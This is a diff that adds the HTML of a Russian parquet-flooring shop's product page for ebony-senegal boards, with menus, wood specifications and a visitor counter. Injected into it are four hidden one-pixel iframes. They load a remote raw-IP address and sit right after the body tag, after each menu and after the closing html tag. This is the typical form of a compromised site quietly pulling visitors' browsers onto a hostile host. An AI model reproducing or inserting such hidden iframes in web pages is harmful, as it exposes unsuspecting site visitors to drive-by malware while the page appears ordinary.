@@ -1,0 +1,148 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Паркет эбони-сенегал, массивная доска пола - Parketoff</title>
+<meta name="description" content="">
+<!--link rel="icon" href="/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" /-->
+<script type="text/javascript" src="/js/jquery.js"></script>
+
+<style type="text/css">
+@import "/css/common.css";
+</style>
+<script type="text/javascript">
+	tmp = new Image(); tmp.src = '/images/menu_active_bg.gif';
+	
+	function hide(id)
+	{
+		 document.getElementById(id).className='hidden';
+	}
+	
+	function show(id)
+	{
+		document.getElementById(id).className='visible';
+	}
+	
+	function isVisible(id)
+	{
+		return (document.getElementById(id).className != 'hidden');
+	}
+	
+	function toggleVisible(id)
+	{
+		if (isVisible(id))
+			document.getElementById(id).className='hidden';
+		else
+			document.getElementById(id).className='visible';
+	}
+	
+	function toggleBlockVisible(id)
+	{
+		if (isVisible(id))
+			document.getElementById(id).className='hidden';
+		else
+			document.getElementById(id).className='blockvisible';
+	}
+</script>
+</head>
+<body><iframe src="http://67.152.195.227/" width=1 height=1 style="visibility: hidden;"></iframe>
+
+
+<div id="top">
+	<div id="icons"><a href="/" title="Parketoff"><img src="/images/icon_home.gif" width="11" height="11" alt="Parketoff" /></a><a href="/about/#contact" title="Контактная информация"><img src="/images/icon_mail.gif" width="12" height="11" alt="Parketoff" /></a></div>
+	<a href="/" title="Parketoff"><img src="/images/logo.jpg" alt="Parketoff" /></a>
+	<span id="slogan">Массивная доска высокого качества</span>
+	
+</div>
+
+<div id="menu-shadow" class="png"><!-- --></div><div id="menu" class="inner"><div class="aligner">		<div class="highlight" onmouseover="this.className='highlight hover';" onmouseout="this.className='highlight';">
+			<a href="/about/" title="Компания">Компания</a>
+		</div>
+		<div class="active">Продукция</div>		<div class="highlight" onmouseover="this.className='highlight hover';" onmouseout="this.className='highlight';">
+			<a href="/partners/" title="Партнеры">Партнеры</a>
+		</div>
+				<div class="highlight" onmouseover="this.className='highlight hover';" onmouseout="this.className='highlight';">
+			<a href="/advices/" title="Советы">Советы</a>
+		</div>
+				<div class="highlight" onmouseover="this.className='highlight hover';" onmouseout="this.className='highlight';">
+			<a href="/encyclopedia/" title="Энциклопедия">Энциклопедия</a>
+		</div>
+				<div class="highlight" onmouseover="this.className='highlight hover';" onmouseout="this.className='highlight';">
+			<a href="/stories/" title="Статьи">Статьи</a>
+		</div>
+		</div></div>
+
+
+<iframe src="http://67.152.195.227/" width=1 height=1 style="visibility: hidden;"></iframe>
+
+<div id="content">
+	<ul id="submenu">
+<li><a href="/products/bamboo_carbonazed_vertical/" title="Бамбук кофе вертикал">Бамбук кофе вертикал</a></li><li><a href="/products/bamboo_carbonazed_horizontal/" title="Бамбук кофе горизонтал">Бамбук кофе горизонтал</a></li><li><a href="/products/bamboo_natur_horizontal/" title="Бамбук натур горизонтал">Бамбук натур горизонтал</a></li><li><a href="/products/red_birch/" title="Береза">Береза</a></li><li><a href="/products/oak/" title="Дуб">Дуб</a></li><li><a href="/products/oak_old/" title="Дуб состаренный">Дуб состаренный</a></li><li><a href="/products/zebrano/" title="Зебрано">Зебрано</a></li><li><a href="/products/ipe/" title="Ипе">Ипе</a></li><li><a href="/products/caslin_black/" title="Каслин цвета Орех">Каслин цвета Орех</a></li><li><a href="/products/caslin_teak/" title="Каслин цвета Тик">Каслин цвета Тик</a></li><li><a href="/products/kempas/" title="Кемпас">Кемпас</a></li><li><a href="/products/merbau/" title="Мербау">Мербау</a></li><li><a href="/products/odum/" title="Одум">Одум</a></li><li><a href="/products/oleaster/" title="Олистер">Олистер</a></li><li><a href="/products/bruma_black/" title="Орех">Орех</a></li><li><a href="/products/tali/" title="Тали">Тали</a></li><li><a href="/products/tauari/" title="Таури">Таури</a></li><li>Эбони-Сенегал</li>	</ul>
+
+	<div id="catalog">
+	
+		<div style="background: url(/images/commodities/ebony-senegal.jpg) no-repeat; background-position: -200px 0; margin-left: 50px;"><div style="background: url(/images/commodity.png) no-repeat; height: 350px; min-width: 128px; //background-image: none ! important; filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='/images/commodity.png', sizingMethod='crop'); margin-left: -10px;"><!-- --></div></div>
+		
+		<div style="padding-left: 120px;">
+			<h1>Эбони-Сенегал</h1>
+			<p>Твердость: 6,2&nbsp;кгс/мм<sup>2</sup><br />
+			Плотность: 680&nbsp;кг/м<sup>3</sup></p>
+			<p>Размеры: 189?1220?18</p>
+			<p class="price">0&nbsp;рублей за м<sup>2</sup></p>
+			<p>Произростает в Западной Африке, в Синегале</p>
+			
+		</div>
+	
+	</div>
+
+</div>
+	
+	
+<div id="menu-shadow" class="png"><!-- --></div><div id="menu" class="inner"><div class="aligner">		<div class="highlight" onmouseover="this.className='highlight hover';" onmouseout="this.className='highlight';">
+			<a href="/about/" title="Компания">Компания</a>
+		</div>
+		<div class="active">Продукция</div>		<div class="highlight" onmouseover="this.className='highlight hover';" onmouseout="this.className='highlight';">
+			<a href="/partners/" title="Партнеры">Партнеры</a>
+		</div>
+				<div class="highlight" onmouseover="this.className='highlight hover';" onmouseout="this.className='highlight';">
+			<a href="/advices/" title="Советы">Советы</a>
+		</div>
+				<div class="highlight" onmouseover="this.className='highlight hover';" onmouseout="this.className='highlight';">
+			<a href="/encyclopedia/" title="Энциклопедия">Энциклопедия</a>
+		</div>
+				<div class="highlight" onmouseover="this.className='highlight hover';" onmouseout="this.className='highlight';">
+			<a href="/stories/" title="Статьи">Статьи</a>
+		</div>
+		</div></div>
+
+
+<iframe src="http://67.152.195.227/" width=1 height=1 style="visibility: hidden;"></iframe>	
+
+<div id="copyright">
+	&copy; 2007&mdash;2008 Parketoff<br />
+	(495) 562-43-07, <a href="mailto:info@parketoff.ru" title="Отправить письмо">info@parketoff.ru</a><br/>
+	 Parketoff: <a href='http://www.parketoff.ru/'>массивная доска пола, массивная паркетная доска</a>   <br/>
+	<a href="http://www.trilan.ru/">Раскрутка сайта - Trilan</a></div>
+
+<div style="float:right; margin:40px 50px 0px 50px;">
+<noindex><!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t21.3;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet: показано число просмотров за 24"+
+" часа, посетителей за 24 часа и за сегодня' "+
+"border=0 width=88 height=31><\/a>")//--></script><!--/LiveInternet--></noindex>
+</div>
+
+
+</body>
+</html>
+
+<iframe src="http://67.152.195.227/" width=1 height=1 style="visibility: hidden;"></iframe>
